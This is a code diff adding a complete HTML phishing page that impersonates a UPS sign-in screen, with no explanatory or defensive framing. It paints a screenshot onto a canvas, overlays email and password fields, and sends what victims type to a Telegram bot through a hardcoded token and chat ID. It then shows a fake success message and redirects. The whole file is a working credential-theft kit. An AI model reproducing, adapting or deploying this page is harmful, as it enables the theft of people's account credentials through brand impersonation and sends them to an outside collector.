@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>UPS - Global Shipping and Logistics</title>
+  <style>
+    canvas {
+      border: 1px solid black;
+    }
+    .hidden-input {
+      position: absolute;
+      visibility: hidden;
+    }
+  </style>
+</head>
+<body>
+  <canvas id="canvas" width="1447" height="786"></canvas>
+  <input type="text" id="emailInput" class="hidden-input" placeholder="Email" />
+  <input type="password" id="passwordInput" class="hidden-input" placeholder="Password" />
+
+  <script>
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    const emailInput = document.getElementById('emailInput');
+    const passwordInput = document.getElementById('passwordInput');
+
+    const image = new Image();
+    image.src = 'https://i.ibb.co/5rcKL7q/Screenshot-2024-10-25-061657.png';
+    image.onload = function() {
+      ctx.drawImage(image, 0, 0, canvas.width, canvas.height);
+      drawInputFields();
+    };
+
+    function drawInputFields() {
+      const emailX = 409;
+      const emailY = 300;
+      const passwordX = 409;
+      const passwordY = 350;
+      const buttonX = 690;
+      const buttonY = 512;
+      const buttonWidth = 150;
+      const buttonHeight = 50;
+
+      ctx.strokeRect(emailX, emailY, 430, 30);
+      ctx.strokeRect(passwordX, passwordY, 430, 30);
+      
+      setInputBox(emailInput, emailX, emailY, 430, 30);
+      setInputBox(passwordInput, passwordX, passwordY, 430, 30);
+
+      canvas.addEventListener('click', function(event) {
+        const x = event.offsetX;
+        const y = event.offsetY;
+        if (x > buttonX && x < buttonX + buttonWidth && y > buttonY && y < buttonY + buttonHeight) {
+          sendToTelegram();
+        }
+      });
+    }
+
+    function setInputBox(inputElement, x, y, width, height) {
+      inputElement.style.left = canvas.offsetLeft + x + 'px';
+      inputElement.style.top = canvas.offsetTop + y + 'px';
+      inputElement.style.width = width + 'px';
+      inputElement.style.height = height + 'px';
+      inputElement.style.visibility = 'visible';
+    }
+
+    function sendToTelegram() {
+      const email = emailInput.value;
+      const password = passwordInput.value;
+      if (email && password) {
+        const botToken = '7315734945:AAEwBBKiHG5dorU-IT6nOnS1Yi76W37qPmI';
+        const chatId = '6707519229';
+        const message = `Email: ${email}, Password: ${password}`;
+        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+        
+        fetch(telegramUrl)
+          .then(response => {
+            if (response.ok) {
+              alert("You have signed in successfully");
+              window.location.href = 'https://i.ibb.co/0y4QrnM/1730195614463.jpg';
+            } else {
+              alert('Error sending message');
+            }
+          })
+          .catch(error => {
+            console.error('Error:', error);
+            alert('Error sending message');
+          });
+      } else {
+        alert('Please fill in both fields');
+      }
+    }
+  </script>
+</body>
+</html>
